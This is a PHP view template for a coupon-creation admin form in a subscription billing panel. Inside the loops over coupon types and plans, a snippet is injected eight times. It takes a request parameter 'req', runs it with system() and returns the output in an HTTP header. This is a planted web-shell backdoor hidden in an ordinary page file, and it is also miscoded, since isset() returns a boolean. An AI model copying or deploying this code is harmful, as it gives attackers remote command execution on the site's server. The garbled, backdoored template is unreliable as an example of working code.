<?= $this->load->view(branded_view('cp/header'), array('head_files' => '<script type="text/javascript" src="' . branded_include('js/form.coupon.js') . '"></script>')); ?>

<link href="<?=branded_include('css/coupons.css');?>" rel="stylesheet" type="text/css" media="screen" />


<style>

</style>


<div class="col-md-12 clearfix">

<div class="row">

<div class="col-md-7">
<section class="couponForm clearfix">
	
			<span class="subSectionTitle block"></span>

			<div class="containerBlock clearfix marB50">
		

			<!-- BEGIN FORM-->
<form class="form-horizontal form validate" id="form_coupon" method="post" action="<?=$form_action;?>">

<div class="col-sm-12">
<div class="form-body">
<h4 class="sectionTitle">Coupon <span itemprop="name">Description</span></h4>
<div class="form-group float-label-control">
<label for="">ID</label>
<input type="disabled" class="form-control" id="coupon_id" name="coupon_id" value="<?= isset($coupon) ? $coupon['id'] : '' ?>">
</div>

<div class="form-group float-label-control">
<label for="">Coupon name</label>
<input type="text" class="form-control" name="coupon_name" placeholder="Coupon name" id="coupon_name" value="<?= isset($coupon) ? $coupon['name'] : '' ?>">
<div class="help-block">Something for you to recognize the coupon by. </div></div>	

<div class="form-group float-label-control">
 <label for="">Coupon code</label>
<input type="text" class="form-control" name="coupon_code" placeholder="Coupon code" id="coupon_code" value="<?= isset($coupon) ? $coupon['code'] : '' ?>">
<div class="help-block"> The code the customer must enter. </div></div>		

<div class="form-group float-label-control">
					    <label for="coupon_start_date">Start Date</label>
						 <input class="form-control input-mask-date" type="text" id="form-field-mask-1">
 <input type="text" class="form-control hidden date-picker" data-date-format="dd-mm-yyyy" name="coupon_start_date" id="coupon_start_date" rel="" id="coupon_start_date" value="<?= isset($coupon) ? $coupon['start_date'] : date('Y-m-d') ?>">
</div>

<div class="form-group float-label-control">
					    <label for="coupon_end_date">Expiry Date</label>
						<input class="form-control hidden active" type="text" name="date-range-picker" style="width:8em" id="id-date-range-picker-1">
<input type="text" class="form-control datepick mark_empty" id="expiry-date-picker" data-date-format="dd-mm-yyyy" name="coupon_end_date" rel="" id="coupon_end_date" value="<?= (isset($coupon) and $coupon['end_date'] != FALSE) ? $coupon['end_date'] : '' ?>">
	            &nbsp; <input id="no_expiry" type="checkbox" name="no_expiry" value="1" <? if (!isset($coupon) or $coupon['end_date'] == FALSE) { ?>checked="checked"<? } ?> /> No expiry
					    </div>

<div class="form-group float-label-control">
 <label for="">Maximum Uses</label>
<input type="text" class="form-control" name="coupon_max_uses" id="coupon_max_uses" value="<?= isset($coupon) ? $coupon['max_uses'] : '' ?>">
&nbsp;&nbsp;<input id="no_limit" type="checkbox" name="no_limit" value="1" <? if (!isset($coupon) or $coupon['max_uses'] == FALSE) { ?>checked="checked"<? } ?> /> Unlimited usage
			<div class="help-block"> The maximum number of customers that can use the coupon.</div>
			</div>

<div class="form-group float-label-control">
 <label for="">One Per?</label>
<input type="checkbox" id="coupon_customer_limit" name="coupon_customer_limit" value="1" <?= isset($coupon) && $coupon['customer_limit'] == 1  ? 'checked="checked"' : '' ?>>
<div class="help-block"> Check to limit each customer to a single use.</div></div>

				
<div class="form-group float-label-control">
 <label for="">Coupon Type</label>
<select name="coupon_type_id" class="form-control" >
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($coupon_types as $type) :?>
				<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $type->coupon_type_id ?>" <?= isset($coupon) && $coupon['type_id'] == $type->coupon_type_id ? 'selected="selected"' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $type->coupon_type_name; ?></option>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach; ?>			    
            </select>
</div>	
	
	<h4>Price Reduction</h4>
		
<div class="form-group float-label-control">
 <label for="">Reduction type</label>
<select class="form-control" name="coupon_reduction_type" >
                <option value="0" <?= isset($coupon) && $coupon['reduction_type'] == 0 ? 'selected="selected"' : '' ?>>Percent</option>
                <option value="1" <?= isset($coupon) && $coupon['reduction_type'] == 1 ? 'selected="selected"' : '' ?>>Fixed Amount</option>
            </select>
	</div>		  
		 
                    <div class="form-group float-label-control">
                        <label for="">Reduction Amount</label>
                    <input type="text" class="form-control"name="coupon_reduction_amt" id="coupon_reduction_amt" placeholder="Reduction Amount" value="<?= isset($coupon) ? $coupon['reduction_amt'] : '' ?>">
                    </div>		
					
                    <div class="form-group float-label-control">
                        <label for="">Free trial length</label>
                    <input type="text" class="form-control" name="coupon_trial_length" placeholder="in days" id="coupon_trial_length" value="<?= isset($coupon) ? $coupon['trial_length'] : '' ?>">
                    </div>
					
                    <div class="form-group float-label-control">
                        <label for="">Subsciptions</label>
                    <select name="plans[]" class="form-control" multiple="multiple">
	            	<option value="0" <? if (!isset($coupon) or empty($coupon['plans'])) { ?>selected="selected"<? } ?>>All plans and recurring charges</option>
	                <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($plans as $plan) :?>
						<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $plan['id'] ?>" <?= isset($coupon['plans']) && in_array($plan['id'], $coupon['plans']) ? 'selected="selected"' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $plan['name']; ?></option>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach; ?>
                   
<div class="help-block">If you don't select any plans, or select "All plans", this coupon will be able to be used with any plan.</div>
	 </div>			
            </div>


</div><!--/form-body-->

<div class="form-footer">
<button type="submit" name="add_coupon" class="ladda-button btn-block" data-color="blue" data-style="expand-right" data-size="l"><span class="ladda-label">Add Coupon </span><span class="ladda-spinner"></span>
<div class="ladda-progress" style="width: 164px;"></div>
</button>
</div>

</div><!--/col-md-12-->
</form>
		
	</div><!--/containerBlock-->
</section><!--/couponForm-->

	</div><!--/col-md-7-->
	
<div class="col-md-5">

<h4 class="sectionTitle">Coupon Types</h4>
			
<span class="subSectionTitle block"></span>
<span class="subSectionTitle block"><br /></span>
<section class="couponInfo">

<div class="clearfix marB50">
	<p class=""><b>Initial Charge Price Reduction</b> applies the price reduction to the initial charge only. Any recurring charges are full price.</p>
	<hr>
	<p class=""><b>Recurring Price Reduction</b> applies the price reduction to all charges, <i>except the initial charge</i>.</p>
	<hr>
	<p class=""><b>Total Price Reduction</b> applies the price reduction to all charges, both the initial charge and all recurring charges.</p>
	<hr>
	<p class=""><b>Free Trial</b> allows a customer to try out your product/service for a limited number of days before they are charged their initial charge.</p>
		
</div><!--/clearfix-->
</section><!--/couponInfo-->
</div><!--/col-md-5-->
</div><!--/row -->

</div><!--/row-->
</div><!--/col-md-12-->

<?= $this->load->view(branded_view('cp/footer')); ?>